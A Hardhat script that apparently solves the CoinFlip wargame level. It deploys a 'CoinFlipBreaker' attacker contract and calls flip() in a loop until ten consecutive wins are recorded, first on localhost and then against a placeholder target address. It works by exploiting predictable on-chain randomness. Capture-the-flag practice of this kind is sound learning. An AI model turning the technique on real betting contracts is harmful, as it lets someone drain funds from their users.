import { ethers } from "hardhat";

// Run on localhost
async function handleTest() {
  const coinFlipFactory = await ethers.getContractFactory("CoinFlip");
  const coinFlip = await coinFlipFactory.deploy();
  await coinFlip.waitForDeployment();

  const coinFlipBreakerFactory = await ethers.getContractFactory(
    "CoinFlipBreaker"
  );
  const coinFlipBreaker = await coinFlipBreakerFactory.deploy(
    await coinFlip.getAddress()
  );
  await coinFlipBreaker.waitForDeployment();

  for (let i = 0; i < 10; i++) {
    const tx = await coinFlipBreaker.flip();
    await tx.wait();
  }

  console.log(await coinFlip.consecutiveWins());
}

async function handleReal() {
  const coinFlip = await ethers.getContractAt("CoinFlip", "0xSPACEGENTLEMAN");
  const coinFlipBreakerFactory = await ethers.getContractFactory(
    "CoinFlipBreaker"
  );
  const coinFlipBreaker = await coinFlipBreakerFactory.deploy(
    await coinFlip.getAddress()
  );
  await coinFlipBreaker.waitForDeployment();

  let wins = await coinFlip.consecutiveWins();

  while (wins < 10) {
    try {
      const tx = await coinFlipBreaker.flip();
      await tx.wait();
    } catch (_) {}
    wins = await coinFlip.consecutiveWins();
    console.log(wins);
  }
}

// handleTest().catch((error) => {
handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
